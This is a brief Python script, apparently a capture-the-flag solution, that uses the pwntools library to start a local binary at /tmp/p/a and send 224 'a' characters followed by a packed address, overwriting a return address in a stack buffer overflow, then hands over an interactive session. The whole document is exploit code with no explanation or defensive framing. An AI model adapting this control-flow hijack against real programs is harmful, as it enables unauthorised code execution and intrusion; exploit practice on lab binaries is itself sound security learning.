#!/usr/bin/env python
from pwn import *
r = process('/tmp/p/a')
r.recvrepeat(0.5)
r.sendline("a"*224 + p64(0x04a2650))
r.interactive()